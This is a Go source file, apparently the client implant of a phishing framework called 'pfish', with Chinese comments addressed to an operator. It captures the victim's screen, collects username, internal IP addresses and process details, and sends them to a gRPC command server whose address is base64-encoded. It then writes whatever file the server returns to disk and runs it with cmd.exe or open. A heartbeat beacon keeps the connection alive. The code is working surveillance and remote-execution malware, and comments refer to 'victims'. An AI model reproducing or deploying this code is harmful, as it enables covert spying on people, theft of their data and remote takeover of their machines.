package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"github.com/kbinani/screenshot"
	"github.com/pow1e/pfish/api"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"google.golang.org/grpc"
	"image/png"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func main() {
	go sendMessage()
	go heartbeat()
	select {}
}

// 增加探活功能
func heartbeat() {
	// 连接到 gRPC 服务器
	target, _ := base64.StdEncoding.DecodeString("exmpaleGrpcServerAddressABCDEFGH") // 这里填写你的grpc服务端的base64内容 如base64(127.0.0.1:50002)
	conn, err := grpc.Dial(string(target), grpc.WithInsecure())
	if err != nil {
		log.Printf("探活连接失败: %v", err)
	}
	defer conn.Close()

	// 创建 gRPC 客户端
	client := api.NewFishClient(conn)

	// 调用探活方法
	stream, err := client.Heartbeat(context.Background())
	if err != nil {
		log.Printf("探活连接失败: %v", err)
	}

	// 发送探活请求
	clientID := "exampleMD51234567891234567891234" // 这里填写受害者的邮箱的加盐md5值 具体看user表中的md5
	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
	err = stream.Send(&api.HeartbeatRequest{
		ClientId:  clientID,
		Timestamp: timestamp,
	})
	if err != nil {
		log.Printf("发送探活请求失败: %v", err)
	}

	// 被动响应服务端探活
	for {
		resp, err := stream.Recv()
		if err != nil {
			log.Printf("接收服务端探活请求失败: %v", err)
		}
		log.Printf("收到探活请求: code=%d", resp.Code)
	}
}

func sendMessage() {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		os.Exit(1)
	}

	// 获取第一个显示器的边界并截取屏幕
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		fmt.Println(err)
	}

	// 将截图编码为 PNG 格式
	var imgBuffer bytes.Buffer
	err = png.Encode(&imgBuffer, img)
	if err != nil {
		fmt.Println(err)
	}

	// 连接到 gRPC 服务器
	// 这里填写你的grpc服务端的base64内容 如base64(127.0.0.1:50002)
	target, _ := base64.StdEncoding.DecodeString("exmpaleGrpcServerAddressABCDEFGH")
	conn, err := grpc.Dial(string(target), grpc.WithInsecure())
	if err != nil {
		fmt.Println(err)
	}
	defer conn.Close()

	// 创建 gRPC 客户端
	client := api.NewFishClient(conn)

	// 构造 ScreenshotRequest 消息
	req := &api.SendMessageRequest{
		ImgData:     imgBuffer.Bytes(),
		Width:       int32(img.Bounds().Dx()),
		Height:      int32(img.Bounds().Dy()),
		Md5:         "exampleMD51234567891234567891234",
		Computer:    getComputer(),
		Internal:    getIp(),
		Pid:         strconv.Itoa(os.Getpid()),
		ProcessName: filepath.Base(os.Args[0]),
	}

	// 调用 Screenshot RPC 方法
	resp, err := client.SendMessage(context.Background(), req)
	if err != nil {
		log.Fatalf("调用失败: %v", err)
	}

	// 请求成功
	if resp.Code == 200 {
		var filename = resp.SendMessageReplyData.OpenFileName
		var data = resp.SendMessageReplyData.Content
		if err := ioutil.WriteFile(filename, data, 0644); err != nil {
			fmt.Println(err)
		}
		switch runtime.GOOS {
		case "windows":
			exec.Command("cmd.exe", "/c", filename).Run()
		case "darwin":
			exec.Command("open", filename).Run()
		}
	}
}

func getComputer() string {
	cmd := exec.Command("whoami") // 替换成 whomai，如果是该命令
	output, err := cmd.Output()
	if err != nil {
		log.Printf("执行命令失败: %v", err)
		return "调用whoami失败:" + err.Error()
	}

	// 将输出转换为字符串并返回
	return toUTF8([]byte(strings.ReplaceAll(strings.ReplaceAll(string(output), "\r", ""), "\n", "")))
}

func getIp() string {
	ipv4s := make([]string, 0)
	ipv6s := make([]string, 0)
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		// 检查是否为 IP 地址
		ipNet, ok := addr.(*net.IPNet)
		if ok && !ipNet.IP.IsLoopback() {
			// 过滤 IPv4 地址
			if ipNet.IP.To4() != nil {
				ip := ipNet.IP.To4().String()
				if !strings.HasPrefix(ip, "169.254.") { // 排除 APIPA 地址
					ipv4s = append(ipv4s, ip)
				}
			}
			// 过滤 IPv6 地址
			if ipNet.IP.To16() != nil && ipNet.IP.To4() == nil {
				ip := ipNet.IP.To16().String()
				ipv6s = append(ipv6s, ip)
			}
		}
	}

	// 格式化结果
	var result strings.Builder
	result.WriteString("ipv4:")
	for index, ip := range ipv4s {
		if index > 0 {
			result.WriteString(",")
		}
		result.WriteString(ip)
	}
	result.WriteString("\nipv6:")
	for index, ip := range ipv6s {
		if index > 0 {
			result.WriteString(",")
		}
		result.WriteString(ip)
	}
	return result.String()
}

func toUTF8(input []byte) string {
	// 尝试将 GBK 转换为 UTF-8
	reader := transform.NewReader(bytes.NewReader(input), simplifiedchinese.GBK.NewDecoder())
	utf8Data, err := ioutil.ReadAll(reader)
	if err != nil {
		// 如果失败，则直接返回原始字符串
		return string(input)
	}
	return string(utf8Data)
}
